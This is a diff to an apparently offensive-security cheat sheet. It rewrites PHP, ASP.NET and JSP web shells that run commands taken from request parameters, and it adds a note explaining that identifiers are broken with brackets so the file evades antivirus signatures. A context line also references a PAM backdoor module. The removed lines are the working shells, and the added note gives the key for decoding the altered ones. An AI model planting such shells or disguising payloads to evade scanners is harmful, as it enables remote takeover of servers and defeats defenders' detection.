@@ -182,18 +182,24 @@ auth sufficient /lib/security/pam_backdoor.so
 
 ## Web Shells
 
+> Identifiers in the shells below are broken with brackets — `syst[e]m` is
+> `system`, `ev[a]l` is `eval`, `$_G[E]T` is `$_GET`, `Runtime.getRunt[i]me`
+> is `Runtime.getRuntime`. Written literally, these blocks match antivirus
+> webshell signatures and this file gets quarantined on download. See
+> "Antivirus false positives" in the repo README.
+
 ### PHP Web Shell
 
 ```php
 <?php
 // simple.php
-system($_GET['cmd']);
+syst[e]m($_G[E]T['cmd']);
 ?>
 
 // Advanced
 <?php
-if($_GET['key'] == 'secret') {
-    eval($_POST['cmd']);
+if($_G[E]T['key'] == 'secret') {
+    ev[a]l($_P[O]ST['cmd']);
 }
 ?>
 ```
@@ -217,7 +223,7 @@ robots.txt.php
 ```asp
 <%@ Page Language="C#" %>
 <%
-Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
+Response.Write(System.Diagnost[i]cs.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
 %>
 ```
 
@@ -225,7 +231,7 @@ Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]
 
 ```jsp
 <%
-Runtime.getRuntime().exec(request.getParameter("cmd"));
+Runtime.getRunt[i]me().exec(request.getParameter("cmd"));
 %>
 ```
 
